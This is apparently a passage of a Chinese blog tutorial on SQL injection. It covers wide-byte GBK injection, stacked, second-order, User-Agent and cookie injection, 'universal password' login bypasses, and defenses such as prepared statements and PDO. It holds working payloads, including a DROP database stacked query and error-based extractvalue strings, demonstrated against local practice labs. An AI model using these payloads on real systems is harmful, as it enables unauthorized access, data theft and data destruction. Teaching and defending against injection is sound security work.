**魔术引号**：当打开时，所有的单引号’ 、双引号" 、反斜杠\\  和 NULL 字符都会被自动加上一个反斜线来进行转义，这个和 addslashes() 函数的作用完全相同。所以，如果魔术引号打开了，就不要使用 addslashes() 函数了。一共有三个魔术引号指令。

*   magic\_quotes\_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。 参见 get\_magic\_quotes\_gpc()。如果 magic\_quotes\_gpc 关闭时返回 0，开启时返回 1。在 PHP 5.4.0 起将始终返回 0，因为这个魔术引号功能已经从 PHP 中移除了。
*   magic\_quotes\_runtime 如果打开的话，大部份从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为 off。 参见 set\_magic\_quotes\_runtime() 和 get\_magic\_quotes\_runtime()。
*   magic\_quotes\_sybase (魔术引号开关)如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖 magic\_quotes\_gpc。如果同时打开两个选项的话，单引号将会被转义成 ''。而双引号、反斜线 和 NULL 字符将不会进行转义。 

可以在 php.ini 中看这几个参数是否开启

![](https://img-blog.csdnimg.cn/20200229130802284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们这里搭了一个平台来测试，这里得感谢其他大佬的源码。

测试代码及数据库：[百度网盘 请输入提取码](http://pan.baidu.com/s/1eQmUArw "百度网盘 请输入提取码") 提取密码:75tu

首先，我们来看一下1的源码，这对用户输入的id用 addslashes() 函数进行了处理，而且是当成字符串处理。

![](https://img-blog.csdn.net/20180824220434497?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

我们输入  [http://127.0.0.1/1/1/?id=1'](?id=1'%20rel=)

这里addslashes函数把我们的 ’ 进行了转义，转义成了 \\'。

![](https://img-blog.csdn.net/20180824222606737?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

所以，我们要想绕过这个转义，就得把 \\' 的 \\ 给去掉。那么怎么去掉呢。

1.  在转义之后，想办法让\\前面再加一个\\，或者偶数个\\即可，这样就变成了\\\\' ，\\ 被转义了，而 ‘ 逃出了限制。
2.  在转义之后，想办法把 \\ 弄没有，只留下一个 ' 。

我们这里利用第2中方法，宽字节注入，这里利用的是MySQL的一个特性。MySQL在使用GBK编码的时候，会认为两个字符是一个汉字，前提是前一个字符的 ASCII 值大于128，才会认为是汉字。

当我们输入如下语句的时候，看看会发生什么。

```
127.0.0.1/1/1/?id=1%df'
```


![](https://img-blog.csdn.net/2018082422264819?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

我们发现页面报错了，而且报错的那里是  '1運''  。我们只输入了 1%df ' ，最后变成了 1運 ' 。所以是mysql把我们输入的%df和反斜杠\\ 合成了一起，当成了 運 来处理。而我们输入的单引号' 逃了出来，所以发生了报错。我们现在来仔细梳理一下思路。 我们输入了 1%df ’ ,而因为使用了addslashes()函数处理 '，所以最后变成了 1%df\\' , 又因为会进行URL编码，所以最后变成了 1%df%5c%27 。而MySQL正是把%df%5c当成了汉字 運 来处理，所以最后 %27 也就是单引号逃脱了出来，这样就发生了报错。而这里我们不仅只是能输入%df ，我们只要输入的数据的ASCII码大于128就可以。因为在MySQL中只有当前一个字符的ASCII大于128，才会认为两个字符是一个汉字。所以只要我们输入的数据大于等于 %81 就可以使 ' 逃脱出来了。

知道怎么绕过，我们就可以进行注入获得我们想要的信息了！

![](https://img-blog.csdn.net/20180824224749709?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

既然GBK编码可以，那么GB2312可不可以呢？怀着这样的好奇，我们把数据库编码改成了GB2312，再次进行了测试。我们发现，当我们再次利用输入 1%df' 的时候，页面竟然不报错，那么这是为什么呢？

这要归结于GB2312编码的取值范围。它编码的取值范围高位是0XA1~0XF7，低位是0XA1~0xFE,而 \\ 是0x5C ，不在低位范围中。所以0x5c根本不是GB2312中的编码。所以，%5c 自然不会被当成中文的一部分给吃掉了。

所以，通过这个我们可以得到结论，在所有的编码当中，只要低位范围中含有 0x5C的编码，就可以进行宽字符注入。

发现了这个宽字符注入，于是很多程序猿把 **addslashes()** 函数换成了 **mysql\_real\_escape\_string()** 函数，想用此来抵御宽字节的注入。因为php官方文档说了这个函数会考虑到连接的当前字符集。

![](https://img-blog.csdn.net/20180824230340194?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

那么，使用了这个函数是否就可以抵御宽字符注入呢。我们测试一下，我们输入下面的语句

```
http://127.0.0.1/1/3/?id=1%df'
```


![](https://img-blog.csdn.net/20180824230625577?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

发现还是能进行宽字节的注入。那么这是为什么呢？原因就是，你没有指定php连接mysql的字符集。我们需要在执行SQL语句之前调用 **mysql\_set\_charse**t 函数，并且设置当前连接的字符集为gbk。

![](https://img-blog.csdn.net/20180825100303626?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

这样当我们再次输入的时候，就不能进行宽字节注入了！

![](https://img-blog.csdn.net/20180824231223744?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

**宽字节注入的修复**

在调用 **mysql\_real\_escape\_string()** 函数之前，先设置连接所使用的字符集为GBK ，**mysql\_set\_charset=('gbk',$conn)** 。这个方法是可行的。但是还是有很多网站是使用的addslashes()函数进行过滤，我们不可能把所有的addslashes()函数都换成mysql\_real\_escape\_string()。

所以防止宽字节注入的另一个方法就是将 **character\_set\_client** 设置为binary(二进制)。需要在所有的sql语句前指定连接的形式是binary二进制：

```
mysql_query("SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary", $conn);
```


当我们的MySQL收到客户端的请求数据后，会认为他的编码是character\_set\_client所对应的编码，也就是二进制。然后再将它转换成character\_set\_connection所对应的编码。然后进入具体表和字段后，再转换成字段对应的编码。当查询结果产生后，会从表和字段的编码转换成character\_set\_results所对应的编码，返回给客户端。所以，当我们将character\_set\_client编码设置成了binary，就不存在宽字节注入的问题了，所有的数据都是以二进制的形式传递。

![](https://img-blog.csdn.net/20180825102304200?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

八：堆叠注入
------

在SQL中，分号;是用来表示一条sql语句的结束。试想一下我们在 ; 结束后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别呢？区别就在于union 或者union all执行的语句类型是有限的，只可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：root';DROP database  user；服务器端生成的sql语句为：Select \* from user where name='root';DROP database user；当执行查询后，第一条显示查询信息，第二条则将整个user数据库删除。

参考：[SQL注入-堆叠注入（堆查询注入）](https://www.cnblogs.com/0nth3way/articles/7128189.html "SQL注入-堆叠注入（堆查询注入）")

          [SQL Injection8(堆叠注入)——强网杯2019随便注](https://blog.csdn.net/qq_26406447/article/details/90643951 "SQL Injection8(堆叠注入)——强网杯2019随便注")

九：二次注入
------

二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力。

1.  黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。
2.  服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。
3.  黑客向服务端发送第二个与第一次不相同的请求数据信息。
4.  服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。
5.  服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功

我们访问 [http://127.0.0.1/sqli/Less-24/index.php](http://127.0.0.1/sqli/Less-24/index.php "http://127.0.0.1/sqli/Less-24/index.php")

是一个登陆页面，我们没有账号，所以选择新建一个用户

![](https://img-blog.csdnimg.cn/20181204091524714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们新建的用户名为：**admin'#**   密码为：**123456**

查看数据库，可以看到，我们的数据插入进去了

![](https://img-blog.csdnimg.cn/20181204091947970.png)

我们使用新建的用户名和密码登录

![](https://img-blog.csdnimg.cn/20181204092025954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

登录成功了，跳转到了后台页面修改密码页面。

我们修改用户名为：admin'#   密码为：aaaaaaaaa

![](https://img-blog.csdnimg.cn/20181204092220974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

提示密码更新成功！

![](https://img-blog.csdnimg.cn/20181204092249574.png)

我们查看数据库，发现用户 **admin'#** 的密码并没有修改，而且 admin 用户的密码修改为了  aaaaaaaaaa

![](https://img-blog.csdnimg.cn/2018120409241396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

那么，为什么会这样呢？我们查看修改密码页面源代码，发现这里存在明显的SQL注入漏洞

![](https://img-blog.csdnimg.cn/20181204093108151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

当我们提交用户名  admin'# 修改密码为 aaaaaaaaaa 的时候，这条SQL语句就变成了下面的语句了。

#把后面的都给注释了，所以就是修改了admin用户的密码为 aaaaaaaaaa

```
$sql = "UPDATE users SET PASSWORD='aaaaaaaaaa' where username='admin'#' and password='$curr_pass' ";
```


十：User-Agent注入
--------------

我们访问 [http://127.0.0.1/sqli/Less-18/](http://127.0.0.1/sqli/Less-18/ "http://127.0.0.1/sqli/Less-18/") ，页面显示一个登陆框和我们的ip信息

当我们输入正确的用户名和密码之后登陆之后，页面多显示了 浏览器的User-Agent

![](https://img-blog.csdnimg.cn/20181204101917617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

抓包，修改其User-Agent为

```
'and extractvalue(1,concat(0x7e,database(),0x7e))and '1'='1  #我们可以将 database()修改为任何的函数
```


![](https://img-blog.csdnimg.cn/20181204103040569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到，页面将当前的数据库显示出来了

![](https://img-blog.csdnimg.cn/20181204103135508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

十一：Cookie注入
-----------

如今绝大部门开发人员在开发过程中会对用户传入的参数进行适当的过滤，但是很多时候，由于个人对安全技术了解的不同，有些开发人员只会对get，post这种方式提交的数据进行参数过滤。

但我们知道，很多时候，提交数据并非仅仅只有get / post这两种方式，还有一种经常被用到的方式：request("xxx"),即request方法。通过这种方法一样可以从用户提交的参数中获取参数值，这就造成了cookie注入的最基本条件：使用了request方法，但是只对用户get / post提交的数据进行过滤。

我们这里有一个连接：www.xx.com/search.asp?id=1 

我们访问：www.xx.com/srarch.asp　发现不能访问，说缺少id参数。

我们将id=1放在cookie中再次访问，查看能否访问，如果能访问，则说明id参数可以通过cookie提交。

那么，如果后端没有对cookie中传入的数据进行过滤，那么，这个网站就有可能存在cookie注入了！

十二**：过滤绕过**
-----------

传送门：[SQL注入过滤的绕过](https://blog.csdn.net/qq_36119192/article/details/102895415 "SQL注入过滤的绕过")

十三：传说中的万能密码 
------------

sql="select\*from test where username=' XX '  and password=' XX '  ";

*   admin' or '1'='1                  XX         //万能密码(已知用户名)
*   XX                                  'or'1'='1     //万能密码(不需要知道用户名)
*   'or '1'='1'#                          XX         //万能密码(不知道用户名)

SQL注入的预防
========

既然SQL注入的危害那么大，那么我们要如何预防SQL注入呢？

(1)预编译(**PreparedStatement**)(JSP)
----------------------------------

可以采用预编译语句集，它内置了处理SQL注入的能力，只要使用它的setXXX方法传值即可。

```
 String sql = "select id, no from user where id=?";      
 PreparedStatement ps = conn.prepareStatement(sql);      
 ps.setInt(1, id);      
 ps.executeQuery();
```


如上所示，就是典型的采用 SQL语句预编译来防止SQL注入 。为什么这样就可以防止SQL注入呢？

其原因就是：采用了PreparedStatement预编译，就会将SQL语句："select id, no from user where id=?" 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该SQL语句的语法结构了，因为语法分析已经完成了，而语法分析主要是分析SQL命令，比如 select、from 、where 、and、 or 、order by 等等。所以即使你后面输入了这些SQL命令，也不会被当成SQL命令来执行了，因为这些SQL命令的执行， 必须先通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为SQL命令来执行的，**只会被当做字符串字面值参数**。所以SQL语句预编译可以有效防御SQL注入。

原理：SQL注入只对SQL语句的编译过程有破坏作用，而PreparedStatement已经预编译好了，执行阶段只是把输入串作为数据处理。而不再对SQL语句进行解析。因此也就避免了sql注入问题。

(2)PDO(PHP)
-----------

首先简单介绍一下什么是PDO。PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持PDO。你可以把PDO看做是php提供的一个类。它提供了一组数据库抽象层API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用PDO连接mysql，也可以用它连接oracle。并且PDO很好的解决了sql注入问题。

PDO对于解决SQL注入的原理也是基于预编译。

```
$data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );       
$data->bindParam( ':id', $id, PDO::PARAM_INT );       
$data->execute();
```


实例化PDO对象之后，首先是对请求SQL语句做预编译处理。在这里，我们使用了占位符的方式，将该SQL传入prepare函数后，预处理函数就会得到本次查询语句的SQL模板类，并将这个模板类返回，模板可以防止传那些危险变量改变本身查询语句的语义。然后使用 bindParam()函数对用户输入的数据和参数id进行绑定，最后再执行，

(3)使用正则表达式过滤
------------

虽然预编译可以有效预防SQL注，但是某些特定场景下，可能需要拼接用户输入的数据。这种情况下，我们就需要对用户输入的数据进行严格的检查，使用正则表达式对危险字符串进行过滤，这种方法是基于黑名单的过滤，以至于黑客想尽一切办法进行绕过注入。基于正则表达式的过滤方法还是不安全的，因为还存在绕过的风险。

对用户输入的特殊字符进行严格过滤，如  ’、”、<、>、/、\*、;、+、-、&、|、(、)、and、or、select、union

![](https://img-blog.csdn.net/20180824085908682?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

(4) 其他
------

*   Web 应用中用于连接数据库的用户与数据库的系统管理员用户的权限有严格的区分（如不能执行 drop 等），并设置 Web 应用中用于连接数据库的用户不允许操作其他数据库
*   设置 Web 应用中用于连接数据库的用户对 Web 目录不允许有写权限。
*   严格限定参数类型和格式，明确参数检验的边界，必须在服务端正式处理之前对提交的数据的合法性进行检查
*   使用 Web 应用防火墙

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

相关文章： [科普基础 | 这可能是最全的SQL注入总结，不来看看吗](https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247487916&idx=1&sn=c9d32431334b9763e142d6eb2146440c&chksm=ec1f4493db68cd85ae41c347d070f81ff3573f9f761739bffa29d8f404798f2bbb2d6cd7a48b&mpshare=1&srcid=1111jL1hiK4qN6A1UlW9gMpp&sharer_sharetime=1573533208503&sharer_shareid=3444167e20a6bda27a1621888298c3dd&from=timeline&scene=2&subscene=1&clicktime=1573533281&enterid=1573533281&key=3629110d6c760ab1a60b2ddbdd463d088f6055a0b54cefecae065835451a5978df677a86604dd257c91d03b0a272a1e9802c5b5614141a18cdf5e587328776d96cdeb93d940939233ee0ff0d796dc71f&ascene=14&uin=MjIwMDQzNjQxOQ%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=FlTFzz%2Bi2MKoo5LexHKUkAbu1BGujyuMMoXot%2B8z%2B4XmJLq1RXJBStxAla8wEduu "科普基础 | 这可能是最全的SQL注入总结，不来看看吗")

                   [Sqlmap的使用](https://blog.csdn.net/qq_36119192/article/details/84479207 "Sqlmap的使用")

                   [Sqli 注入点解析](https://blog.csdn.net/qq_36119192/article/details/82049508 "Sqli 注入点解析")

                   [DVWA之SQL注入考点小结](https://blog.csdn.net/qq_36119192/article/details/82315751 "DVWA之SQL注入考点小结")

                   [常见的SQL语句](https://blog.csdn.net/qq_36119192/article/details/82875868 "常见的SQL语句")

                   [Access数据库及注入方法](https://blog.csdn.net/qq_36119192/article/details/86468579 "Access数据库及注入方法")

                   [SQLServer数据库及注入方法](https://blog.csdn.net/qq_36119192/article/details/88679754 "SQLServer数据库及注入方法")

                   [SQL注入知识库](https://websec.ca/kb/sql_injection#MSSQL_Default_Databases "SQL注入知识库")